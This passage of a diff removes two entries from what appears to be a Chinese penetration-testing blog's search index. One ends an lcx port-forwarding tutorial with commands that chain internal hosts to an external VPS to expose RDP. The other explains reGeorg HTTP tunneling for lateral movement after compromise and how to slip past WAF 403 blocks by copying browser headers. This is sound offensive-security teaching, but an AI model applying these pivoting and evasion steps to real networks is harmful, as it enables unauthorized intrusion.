-<li>连接外网 VPS 机器 3389 端口即连接内网机器 3389 端口</li>
-</ol>
-<h3 id="多台机器："><a href="#多台机器：" class="headerlink" title="多台机器："></a>多台机器：</h3><p>多台机器中间的机器可能只有某台机器可以出外网，可进行转发具体命令如下：<br><strong>机器1(不可出外网)-172.16.1.10：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 172.16.1.20 55 172.16.1.10 3389</span><br></pre></td></tr></table></figure>
-<p><strong>机器2(不可出外网)-172.16.1.20：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 55 172.16.1.30 66</span><br></pre></td></tr></table></figure>
-<p><strong>机器3(可出外网)-172.16.1.30：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 66 192.168.81.128 77</span><br></pre></td></tr></table></figure>
-<p><strong>机器4(外网VPS)-192.168.81.128：</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 77 3389</span><br></pre></td></tr></table></figure>
-<p>连接机器 4 外网 VPS 机器的 3389 端口即连接内网机器 1 的 3389 端口</p>
-]]></content>
-      <categories>
-        <category>工具教程</category>
-      </categories>
-      <tags>
-        <tag>内网工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>reGeorg实战攻防</title>
-    <url>/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们已经通过各种操作getshell之后想要进行内网横向渗透，但因为目标ACL策略设置的比较严格，只允许HTTP协议和对应端口通过。我们无法通过使用端口转发或者是端口映射的方法来从外网访问到内网的其他机器。这时我们就会想到reGeorg这款工具，通过该工具代理进入内网，通过HTTP协议转发请求。</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image1.png"></p>
-<p>这个工具创建之初本意并不是专门用来渗透内网，而是某些企业员工在外网的环境下想访问内网资源。所以这几个安全意识不太足的小哥们写了一个可以通过部署在边界上的网页来进行流量转发，从而访问内网的一个办公工具……</p>
-<p>可以看到该工具的’斯搂梗’是说”每个办公室都需要这样的工具”..</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image2.jpeg"></p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>那么如此厉害的工具究竟是怎么实现的呢？我们一起来看下源码：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image3.png"></p>
-<p>从入口开始，就是标准的一套：LOGO + argparse 来进行参数的支持和解析，真正逻辑从askGeorg函数开始。这个函数是来测试远程代理服务器是否能够访问，我们来看下这个函数的具体内容：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image4.png"></p>
-<p>可以看到内容基本就是判断是否为HTTPS，然后使用哪个工具。用GET方法来请求，如果状态码为 200 且内容跟远程服务器中内容一样就认为是OK的。</p>
-<p>比较的内容就是浏览器访问看到的那一句话：</p>
-<p>Python中：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image5.png"></p>
-<p>php中：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image6.png"></p>
-<p>浏览器访问：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image7.png"></p>
-<p>我们来继续往下看：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image8.png"><br>监听了客户端的端口，并设置TCP的排队上限为1000，这样的对普通情况来说是足够了。</p>
-<p>后边是创建循环不停的接收报文，并且将接收到的传入 session 线程中并启动。</p>
-<p>session的构造比较简单：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image9.png"></p>
-<p>我们来看下线程最重要run中的内容：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image10.png"></p>
-<p>内容不多，就是判断Socks4还是5并解析，之后是创建读写线程并start</p>
-<p>判断Socks4 还是 5：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image11.png"></p>
-<p>Socks代理至少三个字节的请求,第一个字节一定为5，如果是Socks4，则第一个字节一定为4</p>
-<p>parseSocks5和parseSocks4 为判断对应Socks的协议解析是否成功。</p>
-<p>Reader：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image12.png"></p>
-<p>Writer：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image13.png"></p>
-<p>读写部分是一些转发的常规操作。</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image14.png"></p>
-<h2 id="实战攻防"><a href="#实战攻防" class="headerlink" title="实战攻防"></a>实战攻防</h2><p>在实战中使用可能会碰到一些特殊问题：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image15.png"></p>
-<p>比如在浏览器中访问可以出现熟悉的”Georg says，’All seems fine’”，说明可以正常访问。但是使用reGeorgSocksProxy客户端的时候会报’未准备好，请检查url’，这是为什么呢？</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image16.png"><br>排查问题需要进行一些代码调试：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image17.png"></p>
-<p>通过打印出的关键字搜索，可以看到是askGeorg这个函数返回了False 导致了退出程序。</p>
-<p>这时我们可以进行调试，使用Debug来跟进代码，一行一行看到底哪里出错了。当不具备调试环境时也可以使用打印的方法定位问题。</p>
-<p>这里我们使用打印的方法来定位问题：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image18.png"></p>
-<p>我们再尝试运行一下代码，看看哪里出错：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image19.png"></p>
-<p>可以看到返回的状态码为403，也就是说可能被WAF或者其他安全设备拦截掉了。我们通过代码可以获知只有当状态码为200的时候才可以正常使用，并且我们使用浏览器直接打开是可以正常访问的。也就是说我们的问题出现在了Python脚本跟浏览器的请求差异上，比如一些常见的请求头 User-Agent 、Accept-Language等，这些我们需要一一补上。</p>
-<p>我们需要将每一个请求都加入浏览器所包含的请求头，所以我们将该过程提取出来作为函数使用。</p>
-<p>修改后的代码：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image20.png"></p>
-<p>setupRemoteSession中的CONNECT：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image21.png"></p>
-<p>closeRemoteSession中的DISCONNECT:</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image22.png"></p>
-<p>reader中的READ:</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image23.png"></p>
-<p>Writer中的FORWORD:</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image24.png"><br>修改完代码后我们实际进行测试：</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image25.png"></p>
-<p>可以看到返回码已经变为200并且打印出了熟悉的’All seems fine’，说明可以正常使用了。Happy~</p>
-<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image26.jpeg"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>掌握调试/打印等方法不论是对代码审计和修改脚本都有很大的帮助和提升。我们在实战中会碰到各种各样的问题，这时候需要自己细心耐心以及编码修改能力来解决这些问题。这样我们才可以做到在这不断提升的攻防中稳步前行。</p>
-<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
-      <categories>
-        <category>原创文章</category>
-      </categories>
-      <tags>
-        <tag>内网工具</tag>
-      </tags>
   </entry>
 </search>
